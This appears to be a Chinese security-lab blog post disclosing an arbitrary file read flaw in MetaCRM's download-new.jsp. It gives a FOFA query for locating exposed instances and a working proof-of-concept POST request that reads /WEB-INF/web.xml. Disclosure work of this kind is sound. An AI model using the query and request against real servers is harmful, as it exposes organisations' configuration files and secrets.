> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk5MDYxODcwMA==&mid=2247483941&idx=1&sn=2d0124416fb498dc8f044ec3f1ce3919

#  MetaCRM 客户关系管理系统 download-new.jsp 任意文件读取漏洞  
原创 zz  星络安全实验室   2025-07-20 03:48  
  
<table><tbody><tr><td data-colwidth="576"><section><span style="color: rgba(0, 0, 0, 0.9);font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: 0.544px;orphans: 2;text-align: justify;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责</span></span></section></td></tr></tbody></table>  
漏洞详情：  
  
MetaCRM作为一款智能化的平台型客户关系管理软件，旨在通过优化企业运营流程和协同办公机制，显著提升组织管理效能与业务处理效率，助力企业实现数字化卓越运营。该系统的download-new.jsp接口存在本地文件读取安全缺陷，在特定条件下可能被恶意利用，导致攻击者非法获取服务器文件系统中的敏感数据，从而引发企业机密信息泄露风险。该漏洞属于受限文件读取类型，需及时进行安全加固。  
  
漏洞复现：  
  
fofa：  

```
body=&#34;/common/scripts/basic.js&#34; && body=&#34;www.metacrm.com.cn&#34;
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVfkiankw0tcSNyVgbWw5T3CnOHQ745ibviaUzodc9q2d7HVic4wj16YVGAHicb7b9TYltoUdYD2SjuqJkw/640?wx_fmt=png&from=appmsg "")  
  
poc：  

```
POST /business/common/download-new.jsp HTTP/1.1
Host: xx
Content-Type: application/x-www-form-urlencoded

filename=1.png&page=/WEB-INF/web.xml
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVfkiankw0tcSNyVgbWw5T3CndxEGQbJKQVtrA0rMH4a2Q5e7QwHwtFYuuYtDTaQH7SqhsIfOS1W5sw/640?wx_fmt=png&from=appmsg "")  
  
  
  
修复建议：  
  
关注厂商动态，升级至安全版本  
  
